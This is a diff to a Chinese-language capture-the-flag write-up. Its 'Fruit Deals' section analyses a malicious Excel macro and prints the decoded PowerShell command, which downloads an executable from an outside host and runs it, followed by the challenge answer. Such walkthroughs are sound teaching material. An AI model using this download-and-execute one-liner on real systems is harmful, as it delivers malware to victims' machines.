@@ -55,7 +55,12 @@ sym.l* 函数按顺序即可得到flag,但是没找到radare2脚本来一把梭�
 ### Fruit Deals
 一个恶意的xlsm文件,应该是要分析恶意宏
 `Alt+F11`打开宏文件
+改一下脚本打印执行的命令
 
+`poWeRsHELL -command "$oaK = new-object Net.WebClient;$OrA = 'http://fruit.gang/malware';$CNTA = 'banANA-Hakrz09182afd4';$jri=$env:public+'\'+$CNTA+'.exe';try{$oaK.DownloadFile($OrA, $jri);Invoke-Item $jri;break;} catch {}"`
+问的是恶意文件的名字,
+`banANA-Hakrz09182afd4.exe`
+### PES-128
 
 # pwn
 
